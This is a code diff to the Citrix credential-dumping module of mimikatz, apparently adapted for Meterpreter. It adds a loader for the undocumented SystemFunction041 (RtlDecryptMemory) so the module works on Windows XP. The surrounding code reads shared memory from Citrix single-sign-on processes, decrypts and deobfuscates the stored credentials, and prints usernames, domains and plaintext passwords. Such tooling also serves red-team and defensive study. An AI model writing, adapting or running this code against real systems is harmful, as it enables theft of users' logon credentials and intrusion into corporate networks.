@@ -13,6 +13,28 @@ void kuhl_m_misc_citrix_logonpasswords(int argc, wchar_t* argv[])
 	kull_m_process_getProcessInformation(Citrix_Each_SSO_Program, NULL);
 }
 
+// this definition is required by Meterpreter to avoid modifying NTSecAPI.h to patch the declaration of the
+// RtlDecryptMemory function to set the calling convention to __stdcall
+// see: https://github.com/gentilkiwi/mimikatz/blob/0c611b1445b22327fcc7defab2c09b63b4f59804/appveyor.yml#L9
+typedef NTSTATUS(WINAPI * RtlDecryptMemory_t)(PVOID, ULONG, ULONG);
+static NTSTATUS _RtlDecryptMemory(
+	__inout_bcount(MemorySize) PVOID Memory,
+	__in ULONG MemorySize,
+	__in ULONG OptionFlags
+) {
+	NTSTATUS uStatus = ERROR_NOT_FOUND;
+	HMODULE hAdvapi32 = LoadLibrary(TEXT("advapi32"));
+	if (hAdvapi32)
+	{
+		PVOID pFunction = GetProcAddress(hAdvapi32, "SystemFunction041");
+		if (pFunction) {
+			uStatus = ((RtlDecryptMemory_t)pFunction)(Memory, MemorySize, OptionFlags);
+		}
+		FreeLibrary(hAdvapi32);
+	}
+	return uStatus;
+}
+
 DECLARE_CONST_UNICODE_STRING(_U_ssonsvr, L"ssonsvr.exe");
 DECLARE_CONST_UNICODE_STRING(_U_wfcrun32, L"wfcrun32.exe");
 DECLARE_CONST_UNICODE_STRING(_U_AuthManSvr, L"AuthManSvr.exe");
@@ -21,12 +43,9 @@ BOOL CALLBACK Citrix_Each_SSO_Program(PSYSTEM_PROCESS_INFORMATION pSystemProcess
 {
 	DWORD i, ProcessId;
 	HANDLE hProcess;
-	//PKULL_M_MEMORY_HANDLE hMemory;
-	//KULL_M_MEMORY_ADDRESS aMemory = { NULL, &hMemory };
 	RTL_USER_PROCESS_PARAMETERS UserProcessParameters;
 	KULL_M_MEMORY_ADDRESS aRemote = {NULL, NULL}, aBuffer = {&UserProcessParameters, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	PEB Peb;
-	
 
 	UNREFERENCED_PARAMETER(pvArg);
 
@@ -112,6 +131,7 @@ void Citrix_SSO_Program_FileMapping(HANDLE hRemoteProcess, HANDLE hRemoteFileMap
 	HANDLE hFileMapping;
 	PCITRIX_PACKED_CREDENTIALS pCitrixPackedCredentials;
 	PCITRIX_CREDENTIALS pCitrixCredentials;
+	NTSTATUS nStatus;
 
 	if (DuplicateHandle(hRemoteProcess, hRemoteFileMapping, GetCurrentProcess(), &hFileMapping, FILE_MAP_READ, FALSE, 0))
 	{
@@ -123,12 +143,13 @@ void Citrix_SSO_Program_FileMapping(HANDLE hRemoteProcess, HANDLE hRemoteFileMap
 			if (pCitrixCredentials)
 			{
 				RtlCopyMemory(pCitrixCredentials, pCitrixPackedCredentials->Data, sizeof(pCitrixPackedCredentials->Data));
-				if (CryptUnprotectMemory(pCitrixCredentials, sizeof(pCitrixPackedCredentials->Data), CRYPTPROTECTMEMORY_CROSS_PROCESS))
+				nStatus = _RtlDecryptMemory(pCitrixCredentials, sizeof(pCitrixPackedCredentials->Data), RTL_ENCRYPT_OPTION_CROSS_PROCESS); // CryptUnprotectMemory is not Windows XP friendly
+				if (nStatus == STATUS_SUCCESS)
 				{
 					CitrixPasswordDesobfuscate((PBYTE)pCitrixCredentials->password, pCitrixCredentials->cbPassword);
 					kprintf(L"| Username  : %s\n| Domain    : %s\n| Password  : %.*s\n| flags/type: 0x%08x\n", pCitrixCredentials->username, pCitrixCredentials->domain, pCitrixCredentials->cbPassword, pCitrixCredentials->password, pCitrixCredentials->dwFlags);
 				}
-				else PRINT_ERROR_AUTO(L"CryptUnprotectMemory");
+				else PRINT_ERROR_NUMBER(L"RtlDecryptMemory", nStatus);
 
 				LocalFree(pCitrixCredentials);
 			}
